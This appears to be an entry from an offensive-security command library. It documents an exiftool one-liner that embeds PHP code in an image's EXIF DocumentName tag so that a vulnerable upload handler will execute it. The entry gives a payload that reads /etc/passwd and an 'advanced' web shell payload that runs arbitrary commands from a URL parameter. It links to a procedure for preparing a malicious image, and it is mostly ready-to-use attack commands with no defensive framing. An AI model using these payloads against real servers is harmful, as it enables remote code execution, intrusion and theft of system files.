---
id: cmd-exiftool-embed
data: >-
  exiftool -documentname='<?php echo file_get_contents("/etc/passwd"); ?>'
  picture.png
tags:
  - metadata
  - php-injection
type: command
output: 1 image files updated
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:13.393Z'
verified: false
validated: true
submitted: true
---
# exiftool-embed-php

## Command

```bash
exiftool -documentname='<?php echo file_get_contents("/etc/passwd"); ?>' picture.png
```

## Description

Embeds a PHP payload into the documentname EXIF tag of an image file, creating a webshell for RCE when uploaded and accessed as .php.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-documentname` | Sets the EXIF DocumentName tag to the provided string (PHP code) | Yes |
| `picture.png` | Target image file to modify | Yes |

## Examples

### Basic Usage

```bash
exiftool -documentname='<?php echo file_get_contents("/etc/passwd"); ?>' picture.png
```

### Advanced Usage

```bash
exiftool -documentname='<?php system(\$_GET["cmd"]); ?>' image.jpg -overwrite_original
```

## Expected Output

"1 image files updated" - indicates successful metadata write. The file now contains the PHP code in metadata.

## Related

- [[procedures/Prepare-Malicious-Image-with-PHP-Shell]]
- [[commands/exiftool-verify]]
